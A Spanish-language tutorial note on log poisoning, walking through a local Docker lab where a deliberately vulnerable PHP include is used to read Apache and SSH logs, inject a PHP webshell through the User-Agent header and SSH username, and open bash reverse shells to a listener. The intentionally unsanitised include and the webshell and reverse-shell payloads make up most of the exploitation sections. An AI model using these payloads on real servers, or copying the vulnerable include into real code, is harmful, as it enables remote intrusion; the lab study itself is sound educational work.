----
- Tags: #LFI #RCE #vulnerabilidades #web #lfi 
-----
# Definición

> El **Log Poisoning** es una técnica de ataque en la que un atacante **manipula** los **archivos de registro** (**logs**) de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad **LFI** para lograr una **ejecución remota de comandos** en el servidor.

-----

Como ejemplo, trataremos de envenenar los recursos ‘**auth.log**‘ de **SSH** y ‘**access.log**‘ de **Apache**, comenzando mediante la explotación de una vulnerabilidad LFI primeramente para acceder a estos archivos de registro. Una vez hayamos logrado acceder a estos archivos, veremos cómo manipularlos para incluir código malicioso.

En el caso de los logs de SSH, el atacante puede inyectar código PHP en el campo de **usuario** durante el proceso de autenticación. Esto permite que el código se registre en el log ‘**auth.log**‘ de SSH y sea interpretado en el momento en el que el archivo de registro sea leído. De esta manera, el atacante puede lograr una ejecución remota de comandos en el servidor.

Cabe destacar que en algunos sistemas, el archivo ‘**auth.log**‘ no es utilizado para registrar los eventos de autenticación de SSH. En su lugar, los eventos de autenticación pueden ser registrados en archivos de registro con diferentes nombres, como ‘**btmp**‘. Por ejemplo, en sistemas basados en Debian y Ubuntu, los eventos de autenticación de SSH se registran en el archivo ‘auth.log’. Sin embargo, en sistemas basados en Red Hat y CentOS, los eventos de autenticación de SSH se registran en el archivo ‘btmp’. Aunque a veces pueden haber excepciones.

Para prevenir el Log Poisoning, es importante que los desarrolladores limiten el acceso a los archivos de registro y aseguren que estos archivos se almacenen en un lugar seguro. Además, es importante que se valide adecuadamente la entrada del usuario y se filtre cualquier intento de entrada maliciosa antes de registrarla en los archivos de registro.

------
# Explotación Log Poisoning: Apache2

Como primer instancia **crearemos un contenedor** para manipular todo de una manera mas cómoda.

- ``docker pull ubuntu:latest``
- ``docker run -dit -p80:80 -p22:22 --name logPoisoning (image-id-here)`` Hacemos un **Port Forwarding** de dos puertos diferentes, ya que trabajaremos con **SSH (22)** y con **Apache (80)**
- ``docker exec -it logPoisoning bash`` Nos metemos en el contenedor con una Bash
- ``apt update`` Actualizamos el contenedor desde dentro
- ``apt install apache2 ssh nano php -y``
- ``service apache2 start`` y ``service ssh start``
- ``service apache2 status`` y ``service ssh status``

Ahora lo que haremos será ir al directorio **/var/www/html** y borramos el **index.php** para crear uno nuevo, además **crearemos un archivo** con un nombre a modo de prueba llamado *logPoisoning* con el contenido de '*Prueba*'. Al nuevo index.php le colocaremos la siguiente cadena

```php
<?php
	include($_GET['filename']);
?>
```

Esto nos permitirá llamar a un archivo del contenedor simplemente colocando en la url  ``?filename=logPoisoning`` http://localhost/index.php?filename=logPoisoning al ir al URL anterior, **veremos el contenido del archivo logPoisoning**.

Recordemos que el archivo *index.php* **no está sanitizado** para nada, por lo tanto **es vulnerable a LFI**.

-----

Ahora tenemos que saber que hay una ruta la cual es */var/log* que se encarga de **almacenar todos los registros** a nivel Linux, si nosotros mediante el LFI nos dirigimos a esa ruta, podremos ver los logs de manera sencilla, podremos ingresar al archivo **``/var/log/apache2/access.log``** o **``/var/log/auth.log``** para **ver los logs específicamente del servicio web apache2** ya que este está corriendo, allí se verán todas las peticiones enviadas al servidor web de manera clara y si nosotros atentamos por la Web hacia ese archivo con el LFI, podríamos comenzar con el *Log Poisoning* como tal.

==Algo a destacar es que si miramos los propietarios del archivo "access.log" veremos que el grupo es 'adm', los usuarios que formen parte del grupo "adm" suelen estar capacitados para listar el contenido de los logs.==

Cambiaremos el propietario del directorio */var/log/apache2* de forma recursiva desde dentro del contenedor con ``chown www-data:www-data -R apache2/``

Gracias a lo que hicimos previamente, si vamos a la web e intentamos listar el contenido del archivo *access.log* **podremos ver los logs de manera sencilla**. http://localhost/index.php?filename=/var/log/apache2/access.log.
Esta ruta siempre que explotemos un **LFI** conviene tantearla porque suele ser bastante genérica, y si llegamos a tener acceso podríamos derivarlo a algo peor como por ejemplo un **RCE**.


![[LogP 1.png]]

Todo esto se vería de la siguiente manera pero si presionamos ``CTRL+U`` podremos ver todo de una forma **mas organizada**.

![[LogP 2.png]]

-----

Una vez visto todo el contenido del archivo *access.log*, prestaremos atención a donde pone '*Mozilla/5.0'....*" en nuestro caso.
Todo esto es el **User Agent**, es una cadena de texto que identifica el software y el dispositivo que se está utilizando para acceder a un sitio web, en nuestro caso se refiere a la petición nuestra. Cada vez que tramitamos una petición en una Web sea cual sea, en nuestra petición hay una sección llamada **User Agent**, esta la podemos **ver o modificar utilizando Burpsuite**.

Si nosotros por ejemplo tramitamos una petición con ``curl`` desde nuestro equipo de la siguiente manera
==ANTES DE ENVENENAR LOS LOGS, ES IMPORTANTE SABER QUE UN ERROR PUEDE LLEGAR A CORROMPER EL ARCHIVO Y DEJANDOLO NO FUNCIONAL, POR LO TANTO HAY QUE TENER CUIDADO CON LO QUE COLOCAMOS==

- ``curl -s -X GET "http://localhost/probando" -H "User-Agent: PROBANDO"`` **-H** para controlar una cabecera especificada y incrustarle información, en nuestro caso la cabecera "**User-Agent**" donde le pasamos la cadena "*Probando*"

Esto como tal en la Shell no dará nada, pero si miramos los Logs desde la web, veremos que la petición fue registrada.

![[LogP 3.png]]

Como nosotros nos encontramos en una Web que contempla **PHP**, si nosotros lográramos **inyectar código php** podríamos derivar a algo mas grave.

Si nosotros en el ``curl``, tramitamos lo mismo que recién pero esta vez con **un código php de interés** como por ejemplo haciendo uso de la función ``phpinfo();`` para listar la **información de todo el PHP** y ver si está activa la función ``system();``que es la que nos sirve para ejecutar comandos a nivel de sistema.

- ``curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo(); ?>"``

Con esto **podremos ver la tabla phpinfo**, pero no podremos en el formato ``CTRL+U``, debemos verlo de manera común.

Ahora debemos filtrar con ``CTRL+F`` por "disable_functions". Siempre es **interesante ver esta tabla una vez que podamos inyectar código malicioso php en una web**, ya que nos dará mucha información que nos puede ser de utilidad.

![[LogP 5.png]]

----

Como nuestro servidor no tiene deshabilitada la función ``system();`` podemos hacer lo siguiente:

- ``curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami'); ?>"``

![[LogP 4.png]]

De esta forma también podríamos colocar en el User-Agent lo siguiente ``<?php system(\$_GET['cmd']); ?>`` **Escapando el símbolo de dólar** ``\$``, ya que en bash puede generar conflicto.

- ``curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"``

Ahora si en el URL de la web agregamos un ``&cmd=`` seguido del comando que queramos ejecutar, podremos ejecutarlo de forma rápida y sencilla.

![[LogP 6.png]]

Gracias a esto, podríamos derivar todo a una **Reverse shell** gracias a la función ``system($_GET['cmd']);``, colocando en la URL en el campo ``&cmd=`` la siguiente cadena perteneciente a una **Reverse Shell con el uso de bash**.

- ``http://localhost/index.php/?filename=/var/log/apache2/access.log&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.193/1234 0>%261"`` recordemos que se URLENCODEAN los ``&``

Nos colocamos en escucha con Netcat y luego enviamos la solicitud anterior.

- ``nc -nlvp 1234``

Y con esto tendríamos acceso al servidor, ahora solo **faltaría hacerle un tratamiento** para que sea mas intuitivo todo.

--------
# Explotación Log Poisoning: SSH

Para envenenar los Logs de autenticación de un **SSH**, se puede hacer de la siguiente manera, intentando atentar contra el *auth.log* y si no contra el *btmp*.

- Colocaremos como propietario y grupo a *www-data* en los archivos *btmp* y *auth.log* con ``chown www-data:www-data btmp``

Primero a modo de prueba en la terminal **estaremos dentro del contenedor** en el directorio */var/log/* para ver el comportamiento del archivo *btmp*, luego en otra terminal enviaremos un intento de conexión por **SSH** hacia la **IP del contenedor**.
Ahora revisaremos el archivo *btmp* para ver **si quedó registrado nuestro intento de conexión** por SSH.

==ANTES DE ENVENENAR LOS LOGS, ES IMPORTANTE SABER QUE UN ERROR PUEDE LLEGAR A CORROMPER EL ARCHIVO Y DEJANDOLO NO FUNCIONAL, POR LO TANTO HAY QUE TENER CUIDADO CON LO QUE COLOCAMOS==

![[LogP 7.png]]

Como vimos que **quedó registrado el intento de conexión**, ya sabemos lo que podemos hacer, intentar **inyectar código malicioso**.

- ``ssh <?php system($_GET["cmd"]); ?>@172.17.0.2``

Ahora si pudiésemos listar el contenido el archivo *btmp* a través del **LFI**, con el parámetro ``&cmd=`` en la URL podríamos ejecutar comandos, como por ejemplo una **Reverse Shell** colocándonos en escucha con ``nc nlvp 1234``

- ``http://localhost/index.php/?filename=/var/log/btmp&cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.193/1234 0>%261"``

![[LogP 8.png]]

Y de esta forma ya tendríamos un **RCE con una bash interactiva**, solo faltaría aplicar tratamiento para que sea mas cómodo manipularla.




